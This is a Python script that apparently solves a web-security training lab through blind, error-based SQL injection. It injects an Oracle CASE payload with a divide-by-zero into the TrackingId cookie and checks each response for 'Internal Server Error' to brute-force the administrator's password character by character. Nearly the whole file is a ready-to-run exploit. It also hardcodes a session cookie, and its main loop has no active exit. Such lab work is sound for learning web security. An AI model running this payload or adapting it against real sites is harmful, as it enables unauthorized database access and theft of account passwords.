import requests
import string
import sys

url = "https://ac131f411edbea44c07f22ee00870099.web-security-academy.net"

#For debugging
proxy = dict(https='http://127.0.0.1:8080',http='http://127.0.0.1:8080')

#Match for
hit = "Internal Server Error"

password = ""
index = 1

brute_words = string.ascii_letters + string.digits

while True:
    for i in brute_words:
        sys.stdout.write(f"\r[+] Password: {password}{i}")
        payload = f"'||(SELECT CASE WHEN SUBSTR(password,{index},1)='{i}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        post_cookies = dict(TrackingId=f'TgEmMhIk2LKwVkzi{payload}',session='fwExljfBxZUEmiEc0U6bqU2gQbQOokc6')
        r = requests.get(url , cookies= post_cookies)
        #r = requests.get(url , cookies= post_cookies,proxies = proxy,verify=False)

        if hit in r.text:
            password += i
            index += 1

        #if index == 22:
        #    break
            
    #break

print("\n[+]Cracked:")
print(f"[+]Password is: {password}") 
